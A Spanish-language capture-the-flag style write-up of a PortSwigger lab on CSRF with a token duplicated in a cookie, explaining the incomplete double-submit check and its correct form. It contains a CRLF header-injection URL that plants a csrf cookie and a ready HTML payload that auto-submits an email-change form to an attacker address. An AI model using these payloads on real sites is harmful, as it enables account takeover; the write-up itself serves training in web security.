# PortSwigger Lab: CSRF where token is duplicated in cookie

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-F%C3%A1cil-yellow)
![Tipo](https://img.shields.io/badge/Tipo-CSRF%20Double%20Submit-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF con token duplicado en cookie.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- Double-Submit Cookie (incompleto)
- HTTP Response Splitting
- Cookie injection
- Timing attacks (img onerror + form submit)

## Flujo resumido

```
Login → Cambiar email → Interceptar
→ Token en cookie = Token en parámetro
→ Probar token arbitrario → Funciona
→ HTTP Response Splitting → Inyectar cookie
→ Payload: img (inyecta) + form (POST)
→ Exploit server → Víctima
```

## Vulnerabilidad clave

El servidor implementa "double-submit CSRF" pero **incompleto**.

Valida: `cookie_token === parámetro_token`

No valida: `token === sesión_token`

Resultado: Cualquier token funciona si está en ambos lugares.

## Double-Submit correcto vs incorrecto

**Correcto:**
1. Generar token único por sesión
2. Guardar en cookie Y en sesión
3. En POST, validar que ambos coincidan Y que coincidan con sesión

**Incorrecto (este lab):**
1. Solo validar que cookie y parámetro coincidan
2. No verifica si token es conocido por servidor
3. Cualquier valor sincronizado = válido

## HTTP Response Splitting

Campo de búsqueda refleja parámetro sin sanitizar:

```
/?search=daw%0d%0aSet-Cookie:%20csrf=TOKEN%3b%20SameSite=None
```

CRLF (`%0d%0a`) permite inyectar nuevo header `Set-Cookie`.

## Payload

```html
<img src="https://target.com/?search=...INJECTION" onerror="document.forms[0].submit()">
<form method="POST" action="https://target.com/my-account/change-email">
  <input name="email" value="attacker@attacker.com">
  <input name="csrf" value="TOKEN_ARBITRARIO">
</form>
```

**Flujo:**
1. Imagen inyecta cookie con token arbitrario
2. Imagen no existe → onerror
3. Formulario POST con mismo token se envía
4. Cookie + parámetro coinciden → Validación pasa

## Diferencia con Lab 4

| Lab 4 | Lab 5 |
|-------|-------|
| csrfKey + csrf (diferentes) | csrf + csrf (iguales) |
| Inyectar csrfKey | Inyectar csrf |
| Validar coincidencia entre sí | Validar coincidencia entre sí |
| Más complejo | Más simple |

Lab 5: mismo token duplicado en dos lugares.

## Referencias

- [PortSwigger — CSRF tokens](https://portswigger.net/web-security/csrf#tokens)
- [OWASP — Double Submit CSRF](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#double-submit-cookie)
- [HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
